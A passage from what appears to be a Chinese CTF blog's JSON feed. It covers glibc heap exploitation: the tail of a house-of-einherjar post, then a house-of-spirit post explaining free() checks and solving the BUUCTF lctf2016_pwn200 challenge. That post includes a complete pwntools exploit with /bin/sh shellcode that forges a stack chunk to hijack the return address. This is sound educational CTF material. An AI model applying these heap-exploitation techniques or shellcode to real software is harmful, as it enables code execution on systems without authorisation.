punctuation\">&#123;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token expression\">FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                    <span class=\"token expression\">FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token expression\">P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    <span class=\"token expression\">P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                  <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>              <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token expression\">P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token expression\">P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>              <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token expression\"><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token expression\"><span class=\"token punctuation\">&#125;</span></span></span></pre></td></tr></table></figure><blockquote>\n<p>个人人为此次攻击利用和攻击面上都比较大</p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-einherjar"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/12/house-of-spirit/",
            "url": "https://yhuanhuan01.github.io/2024/07/12/house-of-spirit/",
            "title": "house-of-spirit",
            "date_published": "2024-07-12T01:18:27.000Z",
            "content_html": "<h1 id=\"house-of-spirit\"><a class=\"markdownIt-Anchor\" href=\"#house-of-spirit\">#</a> house-of-spirit</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— 至今</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<ul>\n<li>fake chunk 的 ISMMAP 位不能为 1, 因为 free 时，如果是 mmap 的 chunk, 会单独处理</li>\n<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>\n<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li>\n<li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem</li>\n<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li>\n</ul>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A、chunk B、chunk C、chunk D</code></li>\n<li>对  <code>A</code>  写操作的时候溢出，修改  <code>B</code>  的  <code>size</code>  域，使其能包括  <code>chunk C</code></li>\n<li>释放  <code>B</code> ，然后把  <code>B</code>  申请回来，再释放  <code>C</code> ，则可以通过读写  <code>B</code>  来控制  <code>C</code>  的内容</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>\n<p>在栈中构造 fake chunk，大小覆盖掉函数的返回地址，再次分配得到返回地址控制，写入 one_gadget 或者 shellcode 地址。</p>\n</li>\n<li>\n<p>注意如果构造 fastbin，free 函数会检测 next chunk 的大小与当前的 fake chunk 大小是否一致，需要绕过！</p>\n</li>\n</ul>\n<p>three:</p>\n<ul>\n<li>\n<p>伪造堆块：在可控的两个堆块构造好数据，将它伪造成一个 fastbin</p>\n</li>\n<li>\n<p>覆盖堆指针指向上一步伪造的堆块</p>\n</li>\n<li>\n<p>释放堆块，将伪造的堆块释放入 fastbin 的单链表里面</p>\n</li>\n<li>\n<p>申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的</p>\n</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2xjdGYyMDE2X3B3bjIwMA==\">BUUCTF 在线评测 (buuoj.cn)</span></p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711205503306.png\" alt=\"image-20240711205503306\"></p>\n<p>存在 rwx，可以在栈上放 shellcode</p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711213614053.png\" alt=\"image-20240711213614053\"></p>\n<p>可以泄露 rbp</p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711210319465.png\" alt=\"image-20240711210319465\"></p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711211709494.png\" alt=\"image-20240711211709494\"></p>\n<p>存在溢出，buf 可以溢出到 dest 变量</p>\n<blockquote>\n<p>写之前</p>\n</blockquote>\n<p><img data-src=\"/img/house-of-spirit/image-20240711214315664.png\" alt=\"image-20240711214315664\"></p>\n<blockquote>\n<p>写之后</p>\n</blockquote>\n<p><img data-src=\"/img/house-of-spirit/image-20240711214405880.png\" alt=\"image-20240711214405880\"></p>\n<p><img data-src=\"/img/house-of-spirit/image-20240711205554791.png\" alt=\"image-20240711205554791\"></p>\n<p>只能去申请 0-0x80 大小的 chunk。可以看到 ptr 会被再次申请回来。而 dele 可以去 free 之前的 ptr。</p>\n<p>所以我们可以去覆写 ptr，从而劫持返回地址，写入 shellcode 即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x51</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp<span class=\"token operator\">-</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>伪造 fake_chunk—— 可惜这样并不行。</p>\n<p>原因：堆是向高地址生长的，而栈是有低地址生长的</p>\n<blockquote>\n<p>pl = p64(0) + p64(0x61) + p64(0) + p64(0) + p64(0) + p64(0)*2 + p64(rbp-0xb0)</p>\n</blockquote>\n<p>注意：一样要注意再次 malloc 时堆块的大小，否则此检查不过</p>\n<blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fail <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize_nomask</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> SIZE_SZ</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t    <span class=\"token operator\">||</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> av<span class=\"token operator\">-></span>system_mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t    <span class=\"token function\">__libc_lock_unlock</span> <span class=\"token punctuation\">(</span>av<span class=\"token operator\">-></span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fail<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t  <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"free(): invalid next size (fast)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></blockquote>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp:</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">:'</span></span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'who are u?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x90'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>rbp <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'rbp'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'give me your id ~~?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'97'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>pl <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp<span class=\"token operator\">-</span><span class=\"token number\">0xb0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"give me money~\\n\"</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'your choice : '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'80'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'3. goodbye'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-spirit/image-20240712090910366.png\" alt=\"image-20240712090910366\"></p>\n<p>总结：此次攻击 fake 堆块到栈上，从而劫持返回地址。注意的问题，需要 malloc 出 fake_chunk 的 size 要合适。堆栈反向增长，这里一定要注意。（一定要注意回车适合输入！</p>\n<blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyLWhvdXNlLW9mJUU3JUIzJUJCJUU1JTg4JTk3\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of 系列</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW5kYTBzLnRvcC8yMDIxLzA2LzEwL2hvdXNlLW9mLXNwaXJpdC8=\">https://panda0s.top/2021/06/10/house-of-spirit/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjY2MzU1Lmh0bQ==\">https://bbs.kanxue.com/thread-266355.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYW50ZXJuLmNvb2wvbm90ZS1wd24taG91c2Utb2Ytc3Bpcml0L2luZGV4Lmh0bWw=\">https://lantern.cool/note-pwn-house-of-spirit/index.html</span></p>\n</blockquote>\n<p>增文：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">__libc_free</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    mstate ar_ptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    mchunkptr p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">atomic_forced_read</span> <span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span><span class=\"token punctuation\">(</span>hook <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token 